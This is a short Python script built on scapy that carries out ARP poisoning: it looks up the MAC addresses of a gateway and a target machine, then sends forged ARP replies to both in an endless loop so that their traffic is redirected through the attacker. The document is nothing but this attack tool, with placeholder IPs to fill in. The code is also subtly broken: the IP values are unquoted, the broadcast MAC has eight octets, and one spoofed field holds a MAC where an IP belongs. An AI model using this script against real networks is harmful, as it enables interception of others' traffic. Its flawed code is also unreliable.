from scapy.all import *

gw = 000.000.000.000 #Enter default gateway
target = 000.000.000.000 #Enter the targets IP address
def get_mac(ip):
    resp , noresp = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff:ff:ff",pdst=ip),retry=2,timeout=5)
    for s,r in resp:
        return r[ARP].hwsrc
    return None
def arp_poison(gate_ip,gate_mac, target_ip, target_mac):
    while True:
        send(ARP(op=2, pdst=gate_ip,hwdst=gate_mac,psrc = target_mac))
        send(ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=gate_ip))
gate_mac = get_mac(gw)
target_mac = get_mac(target)
arp_poison(gw,gate_mac,target,target_mac)
